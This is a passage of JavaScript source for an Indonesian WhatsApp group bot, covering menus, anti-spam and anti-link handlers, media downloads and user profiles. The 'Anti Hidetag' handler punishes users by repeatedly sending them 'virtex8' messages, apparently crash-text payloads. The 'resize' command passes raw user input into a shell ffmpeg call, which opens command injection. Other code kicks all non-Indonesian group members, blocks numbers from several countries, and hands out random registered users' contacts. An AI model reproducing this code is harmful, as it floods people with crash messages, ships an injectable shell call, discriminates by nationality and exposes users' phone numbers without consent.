xdev.sendMessage(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks }, { showAdAttribution: true, quoted: setQuoted })
} else if(orquoted && replyType === "web"){
xdev.sendMessageV2(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks }, { showAdAttribution: true, quoted: setQuoted })
} else if(!orquoted && replyType === "mess"){
xdev.sendMessage(from, {text: teks}, { quoted: setQuoted })
} else if(orquoted && replyType === "mess"){
xdev.sendMessageV2(from, {text: teks}, { quoted: setQuoted })
} else if(replyType === "troli"){
let template = generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': ofrply,
'itemCount': "2022",
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': botName,
'sellerJid': `62887435047326@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted
});
await xdev.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else {
xdev.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
//================================================================================\\
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
const buttonMessage = {
contextInfo: options,
document: fs.readFileSync('./ACTION/PLICE/DOCUMENT/file.docx'),
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
title : "Footer text", 
fileLength : 999999999999, 
pageCount: 100, 
fileName : botName, 
caption: text1,
footer: desc1,
buttons: but,
headerType: "DOCUMENT"
}

await xdev.sendMessage(id, buttonMessage,options)
} 
 


// Public & Self
if (!publik && !itsMe && !isOwner && !theOwner) return
 

// Bot Status
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
 })
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
		
//================================================================================\\				
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
xdev.sendMessage(from, { text: teks }, { quoted: setQuoted })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  xdev.sendMessage(from, { text: teks, contextInfo: { "mentionedJid": memberr }}):  xdev.sendMessage(from, { text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: setQuoted})
}
const sendMess = (hehe, teks) => {
xdev.sendMessage(hehe, { text, teks })
}
const buttonWithText = (from, text, footer, buttons) => {
return xdev.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
xdev.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: setQuoted})
}; 
const sendvn = (teks) => {
xdev.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}        
const sendSticker = (pesan) => {
xdev.sendMessage(from, {sticker: pesan}, {quoted:setQuoted })
}
//================================================================================\\
const onlyOwner = async() =>{
if (autovn){
sendvn(gakmau)
}else if (autoSticker){
sendSticker(khususowner)
}else {
setReply(mess.only.ownerB)
}
}
//OnlyAdmin
const onlyAdmin = async() =>{
if (autovn){
sendvn(gakmau)
}else 
if (autoSticker){
sendSticker(hanyaadmin)
}else {
setReply(mess.only.admin)
}
}
//OnlyBadmin
const onlyBadmin = async() =>{
if (autoSticker){
sendSticker(jadiinadmin)
}else {
setReply(mess.only.Badmin)
}
}
	
const onlyGroup = async() =>{
setReply(mess.only.group) 
}	

const onlyWait = async() =>{
if (autoSticker){
sendSticker(spam1)
}else {
setReply(mess.wait)
}
}	

			
const onlyRegist = async() =>{
if (autobutton){
xdev.sendButMessage(from, `Kamu belum register kak\nSilahkan register terlebih dahulu`, fake, [{buttonId: `${prefix}verify`, buttonText: { displayText: "𝖉𝖆𝖋𝖙𝖆𝖗"},type: 1}],setQuoted);
}else {
setReply("Kamu belum register kak\nSilahkan register terlebih dahulu")
}						
}			

const onlyBan = async() =>{
if (autobutton){
xdev.sendButMessage(from, `Maaf kakak sudah terban silahkan chat owner untuk membukanya`, fake, [{buttonId: `${prefix}owner`, buttonText: { displayText: "𝖔𝖜𝖓𝖊𝖗"},type: 1}],setQuoted);
}else {
setReply("Maaf kakak sudah terban silahkan chat owner untuk membukanya")
}						
}									
												
const onlyPrem = async() =>{
if (autobutton){
xdev.sendButMessage(from, `Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem`, fake, [{buttonId: `${prefix}owner`, buttonText: { displayText: "𝖔𝖜𝖓𝖊𝖗"},type: 1}],setQuoted);
}else {
setReply("Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem")
}						
}
																							
//================================================================================\\
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
console.log("Sukses remove spammer")
}
SpamExpired(senderNumber, "NotCase", AntiSpam)
if(cekSpam("Case",senderNumber, AntiSpam)){
console.log("antispam Case aktif")
return
}


//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "30s", AntiSpam)
if(autovn) {
return sendvn(nospam)
} else {
return setReply(textspam)
}
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "30s", AntiSpam)
if(autovn) {
return sendvn(nospam)
} else {
return setReply(textspam)
}
}
if (isCmd && !isOwner) msgFilter.addFilter(from)


//================================================================================\\
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('admin grup mah bebas yekan :v')
let linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await xdev.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await xdev.groupParticipantsUpdate(from, [sender], 'remove')
await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }
 
 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.jid)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.jid == member[i]) 
if (!usersId.groupAdmins ){
 await xdev.groupParticipantsUpdate(from, [member[i]], 'remove')
}
}
}
}  

//Anti Hidetag
if(budy.startsWith(`${prefix}hidetag`) && isAntihidetag){
if(isGroupAdmins) await xdev.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await xdev.sendKatalog(sender, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
await xdev.sendMessage(sender, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(sender, { text: "awowkwkwk" }, { quoted: lep });
await sleep(1000)
}
}

//Auto Hit 
if(isCmd){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`

//================================================================================\\
if(textMenu === "menu1"){
var menunya = menu1(senderNumber, user, thisHit, publik, sender, prefix, isDevoloper, pushname)
} else if(textMenu === "menu2"){
var menunya = menu2(senderNumber, user, thisHit, publik, sender, prefix, isDevoloper, pushname)
} else if(textMenu === "menu3"){
var menunya = menu3(senderNumber, user, thisHit, publik, sender, prefix, isDevoloper, pushname, ucapanWaktu)
}
//================================================================================\\
if(textFitur === "fitur1"){
var fiturnya = fitur1(prefix)
} else if(textFitur === "fitur2"){
var fiturnya = fitur2(prefix)
} else if(textFitur === "fitur3"){
var fiturnya = fitur3(prefix)
}
//========================================================================================================================//
if ( isHit && isCmd ) {

try {
if (userLevel === undefined && userId === undefined) {
addUserId(calender, pushname, senderNumber, user)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp, user)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp, user)


let anune =`${userLevel}0000`
let susu = randomNomor(math(anune))
tambahLimit(sender, susu)





let levelnih = userLevel + 1

let teks = `*]───「 LEVEL UP 」───[*

🆔 Nama : ${pushname} 
✅ Verified : ${userVerified}
📉 Limit : ${getLimit(sender)}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%`
//but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}
//========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && dev.message.stickerMessage.contextInfo != null ? dev.message.stickerMessage.contextInfo.participant || "" : ""

//AUTO BIO
//xdev.setStatus(`${botName} | ⏰ ${runtime(process.uptime() )} | 🔋 Error`) //.catch((_)=>_);

//SIMINYA BAWG        
if (autorespon === true && !isGroup && !isCmd) {
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`)
let sami = simi.success
xdev.sendMessage(from, { text: sami }, {quoted: setQuoted})           
}


//AUTO RESPON SIMI VIA REPLY/TAG BOT
if (input == botNumber && isGroup && !isCmd && !isAudio || mentionByReplySticker == botNumber && isSticker && !isCmd) {
try{	
await sleep(2000)
xdev.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(setiker)
console.log(namastc)
let buffer = fs.readFileSync(`./ACTION/PLICE/STICKER/STICK/${namastc}.webp`)
xdev.sendMessage(from, {sticker: buffer}, {quoted:setQuoted })
} else{

let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)

let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${input}&lc=id`)
let sami = simi.success  

 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
   await sleep(2000)
 xdev.sendMessage(from,{text: teksnya},{quoted: setQuoted})  
//setReply(`${teksnya}`)
}
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
}

//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
}


//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
console.log(color("Download video with ytdl-core"))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await xdev.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: setQuoted})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
console.log(color("Download audio with ytdl-core"))
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await xdev.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = getRandom('.mp3') 
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
Pe: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
await xdev.sendMessage(from, {contextInfo: {
externalAdReply: {
title: 'Speed', 
body: 'Now Playing...',
description: 'Now Playing...',
mediaType: 2,
thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),
mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`
}
}, audio:  fs.readFileSync(filePath), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}



//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
})       
} 




if (isCmd && !isGroup)		    
console.log(color('[ CP ]'), color(time, 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`pesan dari`, 'yellow'), color(pushname, 'orange'), color(`${sender}`, 'deeppink'))        
if (isCmd && isGroup)            
console.log(color('[ GC ]'), color(time, 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`pesan dari`, 'yellow'), color(pushname, 'orange'), 'in', color(groupName, 'deeppink'))
if (!isGroup) 
console.log(color("[ CMD ]"), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'blue'), color(`[${args.length}]`, 'cyan'), color('pesan dari', 'yellow'), color(`${pushname}`, 'orange'))
if (isGroup) 
console.log(color("[ CMD ]"), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'blue'), color(`[${args.length}]`, 'cyan'), color('pesan dari', 'yellow'), color(`${pushname}`, 'orange'), color('di gc'), color(groupName, 'deeppink'))

//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212') || senderNumber.startsWith('252') || senderNumber.startsWith('92') || senderNumber.startsWith('967')
if (!isGroup && nomerAsing) {
await addBlock(sender, blocked)
console.log(`Nomer asing dari ${senderNumber}`)
return xdev.updateBlockStatus(sender, "block") 
} 

//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
let namastc = messagesC
let buffer = fs.readFileSync(`./ACTION/PLICE/STICKER/STICK/${namastc}.webp`)
xdev.sendMessage(from, {sticker: buffer}, {quoted:setQuoted })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
let buffer = fs.readFileSync(`./ACTION/PLICE/AUDIO/${anju}.mp3`)
xdev.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}

 

//Auto React
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
xdev.sendMessage(from, { react: { text: emot, key: dev.key } })	
}
}

  
// Banchat
if (isGroup && isBanchat) {
if (!isOwner) return 
 }


//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

  
xdev.math = xdev.math ? xdev.math : {}
if(isGroup && from in xdev.math){
console.log(xdev.math)
try{
let id = from
if (!(id in xdev.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(xdev.math[id][1]))
if (budy == math.result) {
clearTimeout(xdev.math[id][3])
delete xdev.math[id]
await setReply(` benar\n\n${math.bonus} XP\n\nmath ${math.mode}`)
} else {
    
if (--xdev.math[id][2] == 0) {
clearTimeout(xdev.math[id][3])
delete xdev.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${xdev.math[id][2]} kesempatan`)
}
}catch(e){

console.log(e)
}
}





//add to dashboard
if(isCmd) Succes(toFirstCase(command), dash, allcommand)
//==========================================================\\
try{
switch(command) {
case 'verify':
case 'daftar':
if (isRegist) return setReply("sudah register kak")
if (isBaned) return onlyBan() 
addRegist(sender, pushname, register)
const kontol = `─── 「 *REGISTERED SUCCESS* 」───
• NAMA : ${pushname}
• NOMOR : ${senderNumber}
• TANGGAL : ${calender}
`
setReply(kontol)
break
case 'menu':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let mok = [
{"buttonId": `${prefix}owner`,"buttonText": {"displayText": `ᴏᴡɴᴇʀ`},"type": "RESPONSE"},
{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
const muk = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${nomerOwner}` } },
{ urlButton: { displayText: `Source Code`, url : `https://github.com/Aztecs444` } },
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules` } },
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}infobotz` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }
]
let options1 =
{ forward,
externalAdReply: {
showAdAttribution: true, 
title: botName, 
body: fake,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: ofrply,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}

/*let options1 =
{ forward,
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 2,
thumbnail: ofrply,
mediaUrl: "https://youtu.be/v4kWLu4Eb1Y",
sourceUrl: "https://www.youtube.com/watch?v=JJwLesqqcmM"
}
}*/
if(setmenu == "document"){
xdev.sendButDoc(from, menunya+readmore+"\n"+fiturnya,fake,dfrply, mok, options1, {quoted: setQuoted})
} else if(setmenu == "location"){
xdev.sendButLoc(from, menunya,""+readmore+fiturnya+"\n"+fake,efrply, mok, options1)
} else if(setmenu == "image"){
xdev.sendButImage(from, menunya, readmore+fiturnya, ofrply,mok) 
} else if(setmenu == "image2"){
xdev.send5ButImg (from, menunya+readmore+"\n"+fiturnya,fake, ofrply, muk) 
} else if(setmenu == "gif"){
xdev.send5ButGif (from, menunya+readmore+"\n"+fiturnya,fake, fs.readFileSync(`./ACTION/PLICE/VIDEO/video.mp4`), muk) 
} else if(setmenu == "location2"){
xdev.send5ButLoc(from, menunya+readmore+"\n"+fiturnya,fake, efrply, muk) 
} else if(setmenu == "katalog"){
xdev.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, ofrply, {quoted: setQuoted})
}
break
case 'kontak':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} ${ownerName}`)      
if (mentionByReply) {
xdev.sendContact(from, `${mentionByReply.split("@")[0]}`, `${args[0]}`)     
} else if(mentionByTag && isGroup) { 
xdev.sendContact(from, `${mentionByTag[0].split("@")[0]}`, `${args[1]}`)          
} else if(!isGroup){
xdev.sendContact(from, `${args[0]}`, `${args[1]}`)
} else setReply("Tag atau Reply usernya")
break
case 'caridoi':
case 'cariteman':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper) return onlyPrem() 
let teman = pickRandom(register) 
let namTemen = teman.name
let nomerTemen = teman.id
setTimeout( () => {
setReply("Sedang mencari....")
},1000)  
setTimeout( () => {
setReply("Berhasil mendapatkan satu org")
},5000)  
setTimeout( () => {           
xdev.sendContact(from, nomerTemen.split("@")[0], namTemen)
},9000)  
break
case 'inspect':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await xdev.inspectLink(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)

}
break
case 'resize':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
onlyWait() 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: setQuoted})
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break
case 'owner':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
xdev.sendContact(from, nomerOwner, ownerName)
break
case 'sewa':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let { dada } = require("./sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
xdev.sendButLoc(from, teks, fake, zreply, gbutsan)                          
}
break
case 'dashboard':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks =`
*Dashboard*
        
Runtime : ${runtime(process.uptime())}
Total Hit : ${thisHit.toLocaleString()}`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});
     
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 

for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
} 
 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   

});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break
case 'info':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const si = require('systeminformation');
let OsInfo = await si.osInfo()
let System = await si.system()
let Cpu = await si.cpu()
let Mem = await si.mem()
let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem
let teks =`System Information`
 teks +=`

Uptime : ${kyun(os.uptime())}

*OS INFO*
Platform: ${platform}
Distro: ${distro}
Release: ${release}
Codename: ${codename}
Kernel: ${kernel}
Arch: ${arch}
Hostname: ${hostname}
Codepage: ${codepage}

*CPU INFO*
Manufacturer: ${manufacturer}
Brand: ${brand}
Vendor: ${vendor}
Family: ${family}
Model: ${model}
Speed: ${speed} Ghz
Governor: ${governor}
Cores: ${cores}
PhysicalCores: ${physicalCores}
Processors: ${processors}

*MEMORY INFO*
Memory : ${FileSize(used)}/${FileSize(total)} 
Free : ${FileSize(free)}
Cached: ${FileSize(cached)}
`
setReply(teks)
}    
break 
case 'me': case 'profile':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let ppimg = await xdev.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let sol = await xdev.fetchStatus(sender)
let stst = sol.status == 401 ? '' : sol.status
let hituser = gethitUser(senderNumber, user)
let persenya =`${userPersen}`
let nana =`${userExp}/${requiredExp}`
let teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
✅ Verified : ${userVerified}
📇 Status : ${isOwner ? 'Owner':'User'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
📉 Limit : ${getLimit(sender)}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`
setReply(teks) 
}
break
case 'status':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
